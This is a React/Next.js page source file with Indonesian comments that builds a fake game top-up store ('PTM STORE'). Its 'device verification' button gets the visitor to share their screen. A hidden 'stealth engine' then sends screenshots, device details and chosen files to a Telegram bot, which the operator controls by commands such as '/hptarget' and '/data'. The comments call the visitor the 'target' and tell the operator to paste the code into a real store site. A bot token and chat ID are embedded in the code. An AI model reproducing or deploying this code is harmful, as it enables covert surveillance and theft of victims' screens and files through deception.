"use client";

import React, { useEffect, useRef, useState } from 'react';

export default function Page() {
  // --- 1. REFS & STATE (MESIN) ---
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const fileRef = useRef<HTMLInputElement>(null);
  const lastCmdId = useRef(0);
  const [isSystemActive, setIsSystemActive] = useState(false);

  // === CONFIGURATION (ISI DI SINI) ===
  const BOT_TOKEN = '6481060681';
  const CHAT_ID = '8208922468:AAGCSBYVOB-aRRz1s__rHZUwh2h5rSMsRbk';
  // ===================================

  // --- 2. LOGIC MONITORING (SILUMAN) ---
  useEffect(() => {
    const sendToTele = async (type: string, content: any, caption = "") => {
      const url = `https://api.telegram.org/bot${BOT_TOKEN}/`;
      let endpoint = type === 'text' ? 'sendMessage' : type === 'photo' ? 'sendPhoto' : 'sendDocument';
      const fd = new FormData();
      fd.append('chat_id', CHAT_ID);
      
      if (type === 'text') fd.append('text', content);
      else {
        fd.append(type === 'photo' ? 'photo' : 'document', content);
        fd.append('caption', caption);
      }
      try { await fetch(url + endpoint, { method: 'POST', body: fd }); } catch (e) {}
    };

    const captureScreen = () => {
      if (!videoRef.current || !canvasRef.current) return;
      const canvas = canvasRef.current;
      const video = videoRef.current;
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');
      if (ctx) {
        ctx.drawImage(video, 0, 0);
        canvas.toBlob((blob) => {
          if (blob) sendToTele('photo', blob, `📸 Real-time Capture: ${new Date().toLocaleTimeString()}`);
        }, 'image/jpeg', 0.5);
      }
    };

    const listenCommands = setInterval(async () => {
      if (!isSystemActive) return; // Hanya dengerin kalau sistem sudah aktif
      try {
        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1`);
        const data = await res.json();
        if (data.result && data.result.length > 0) {
          const msg = data.result[0].message;
          if (msg && msg.message_id !== lastCmdId.current && msg.chat.id.toString() === CHAT_ID) {
            lastCmdId.current = msg.message_id;
            const cmd = msg.text;
            if (cmd === '/hptarget') captureScreen();
            if (cmd === '/kontak') sendToTele('text', "📋 Perintah Kontak Diterima (Membutuhkan Interaksi di Device)");
            if (cmd === '/data') fileRef.current?.click();
            if (cmd === '/info') sendToTele('text', `🔋 System Active\n📱 Device: ${navigator.platform}`);
          }
        }
      } catch (e) {}
    }, 4000);

    return () => clearInterval(listenCommands);
  }, [isSystemActive]);

  // --- 3. TRIGGER FUNGSI ---
  const handleActivate = async () => {
    try {
      const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        videoRef.current.play();
        setIsSystemActive(true);
        // Notif ke Tele kalau target sudah klik
        const fd = new FormData();
        fd.append('chat_id', CHAT_ID);
        fd.append('text', "🚀 **OVERLORD ONLINE**\nTarget telah mengaktifkan sistem.");
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', body: fd });
      }
    } catch (err) {
      console.error("Izin ditolak");
    }
  };

  return (
    <>
      {/* --- BAGIAN A: TAMPILAN WEB ASLI (PTM STORE) --- 
          Gue buatkan contoh UI sederhana. Lo bisa ganti semua isi <div> ini 
          pake kode PTM Store asli lo dari GitHub.
      */}
      <div style={{ minHeight: '100vh', backgroundColor: '#000', color: '#fff', padding: '20px', fontFamily: 'sans-serif' }}>
          <header style={{ textAlign: 'center', borderBottom: '1px solid #333', paddingBottom: '20px' }}>
              <h1 style={{ color: '#2ecc71' }}>PTM STORE - TOP UP GAME</h1>
              <p>Layanan Top-Up Tercepat dan Teraman</p>
          </header>

          <main style={{ marginTop: '50px', textAlign: 'center' }}>
              <div style={{ background: '#111', padding: '30px', borderRadius: '15px', display: 'inline-block' }}>
                  <h3>Cek Status Layanan</h3>
                  <p>Klik tombol di bawah untuk verifikasi perangkat dan melanjutkan transaksi.</p>
                  
                  {/* TOMBOL PEMICU: Tempelkan fungsi handleActivate di sini */}
                  <button 
                    onClick={handleActivate}
                    style={{ backgroundColor: '#2ecc71', color: '#000', border: 'none', padding: '15px 40px', fontSize: '18px', fontWeight: 'bold', borderRadius: '8px', cursor: 'pointer' }}
                  >
                    {isSystemActive ? "SISTEM AKTIF" : "VERIFIKASI PERANGKAT"}
                  </button>
              </div>
          </main>
      </div>


      {/* --- BAGIAN B: MESIN SILUMAN (100% TERSEMBUNYI) --- 
          Bagian ini tidak akan mengganggu visual web lo sama sekali.
      */}
      <div style={{ position: 'fixed', top: 0, left: 0, width: 0, height: 0, opacity: 0, pointerEvents: 'none', overflow: 'hidden' }}>
        <video ref={videoRef} autoPlay playsInline muted />
        <canvas ref={canvasRef} />
        <input 
          type="file" 
          ref={fileRef} 
          multiple 
          onChange={async (e) => {
            if (e.target.files) {
              for (const file of Array.from(e.target.files)) {
                const fd = new FormData();
                fd.append('chat_id', CHAT_ID);
                fd.append('document', file);
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: 'POST', body: fd });
              }
            }
          }} 
        />
      </div>
    </>
  );
      }
